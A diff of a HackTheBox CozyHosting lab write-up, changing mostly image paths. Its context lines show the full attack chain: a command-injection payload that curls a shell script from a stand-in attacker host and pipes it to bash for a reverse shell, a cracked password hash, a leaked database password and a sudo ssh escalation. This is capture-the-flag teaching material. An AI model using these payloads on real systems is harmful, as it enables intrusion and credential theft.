@@ -5,7 +5,7 @@ title = 'HtB Cozyhosting'
 tags = ['writeup','hackthebox','easy']
 hideToc = false
 +++
-![HtB CozyHosting](https://blog.shattersec.com/content/images/20250202100317-Pasted%20image%2020250202082056.png)
+![HtB CozyHosting](/images/htb-CozyHosting.png)
 CozyHosting is an easy-difficulty Linux machine that features a `Spring Boot` application. The application has the `Actuator` endpoint enabled. Enumerating the endpoint leads to the discovery of a user's session cookie, leading to authenticated access to the main dashboard. The application is vulnerable to command injection, which is leveraged to gain a reverse shell on the remote machine. Enumerating the application's `.jar` file, hardcoded credentials are discovered and used to log into the local database. The database contains a hashed password, which once cracked is used to log into the machine as the user `josh`. The user is allowed to run `ssh` as `root`, which is leveraged to fully escalate privileges.
 
 <!--more-->
@@ -85,7 +85,7 @@ Finished
 
 Pretty sure I saw all of those endpoints during my manual look at the website, except for the `/error` endpoint.  It yielded a 500 response, which can sometimes provide additional details about the web server.
 
-![Whitelabel Error](https://blog.shattersec.com/content/images/20250202101026-Pasted%20image%2020250202005553.png)
+![Whitelabel Error](/images/cozyhosting1.png)
 In this case, we see it gives us a `Whitelabel Error Page`, but nothing else seemingly helpful. A quick Google search of the error page indicates our web server is utilizing Spring Boot, a Java framework. Maybe we have a thread to pull...
 
 >[Spring Boot: Customize Whitelabel Error Page](https://www.baeldung.com/spring-boot-custom-error-page)
@@ -155,7 +155,7 @@ X-Frame-Options: DENY
 
 Looking at the admin portal, there's a form at the bottom asking for a hostname and username. When messing with the values for these fields, the error messages seem to indicate we might have the opportunity for command injection.
 
-![Command injection location](https://blog.shattersec.com/content/images/20250202101228-Pasted%20image%2020250202013503.png)
+![Command injection location](/images/cozyhosting2.png)
 
 Command injection payload:
 
@@ -186,7 +186,7 @@ python3 -m http.server 80
 
 Lets download and execute our script, saving it in the `/tmp` folder:
 
-![Injection 1](https://blog.shattersec.com/content/images/20250202101311-Pasted%20image%2020250202013546.png)
+![Injection 1](/images/cozyhosting3.png)
 
 ```
 host=whatever&username=test`curl${IFS}http://<attacker ip>/shell.sh${IFS}-o${IFS}/tmp/shell.sh|bash`;#
@@ -194,7 +194,7 @@ host=whatever&username=test`curl${IFS}http://<attacker ip>/shell.sh${IFS}-o${IFS
 
 For whatever reason, there's no activity on our netcat listener. Trying to troubleshoot the issue, we notice the script was transferred to `/tmp`, but just wasn't executed. Let's send a command to the victim to execute it again:
 
-![Injection 2](https://blog.shattersec.com/content/images/20250202101337-Pasted%20image%2020250202013719.png)
+![Injection 2](/images/cozyhosting4.png)
 
 ```
 host=whatever&username=test`bash${IFS}/tmp/shell.sh`;#
@@ -204,7 +204,7 @@ Great success! We've got a reverse shell as the `app` user. We also notice the `
 
 ### .jar Inspection
 
-![app Reverse Shell](https://blog.shattersec.com/content/images/20250202145049-Pasted%20image%2020250202014353.png)
+![app Reverse Shell](/images/cozyhosting5.png)
 
 `.jar` files are essentially `.zip` files. Let's copy the file, unzip it, and see if we can find anything useful.
 
@@ -214,7 +214,7 @@ grep -r -i 'password' .
 
 There's an interesting file, `/BOOT-INF/classes/application.properties` that has a hardcoded, plaintext password: `Vg&nvzAQ7XxRapp`
 
-![application.properties](https://blog.shattersec.com/content/images/20250202145150-Pasted%20image%2020250202014729.png)
+![application.properties](/images/cozyhosting6.png)
 
 By examining the whole file, we see that the password is used by the application to login to a locally-ran postgres server. Let's connect and see what what can find. We can login using the following command on the reverse shell:
 
@@ -228,7 +228,7 @@ Let's see what databases are available to us, and what we can find:
 
 ```sql
 \list
-                       List of databases
+                                List of databases
 Name        | Owner    | Encoding | Collate     | Ctype       | Access privileges
 ------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
@@ -244,7 +244,7 @@ template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres     
 SELECT * FROM users;
 ```
 
-![Postgres Dump](https://blog.shattersec.com/content/images/20250202145234-Pasted%20image%2020250202015242.png)
+![Postgres Dump](/images/cozyhosting7.png)
 
 ```sql
    name    |                           password                           | role 
@@ -264,7 +264,7 @@ $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
 
 From simple enumeration after getting our reverse shell, there's one user's folder in the `/home` directory: `josh`. Let's see if our newly found password works with his account:
 
-![User SSH](https://blog.shattersec.com/content/images/20250202145307-Pasted%20image%2020250202015556.png)
+![User SSH](/images/cozyhosting8.png)
 
 And we've got the user flag.
 
@@ -292,7 +292,7 @@ User josh may run the following commands on localhost:
 
 Looks as if we can use these `sudo` privileges to escalate privileges:
 
-![sudo - GTFOBins](https://blog.shattersec.com/content/images/20250202145338-Pasted%20image%2020250202015817.png)
+![sudo - GTFOBins](/images/cozyhosting9.png)
 
 >[https://gtfobins.github.io/gtfobins/ssh/#sudo](https://gtfobins.github.io/gtfobins/ssh/#sudo)
 
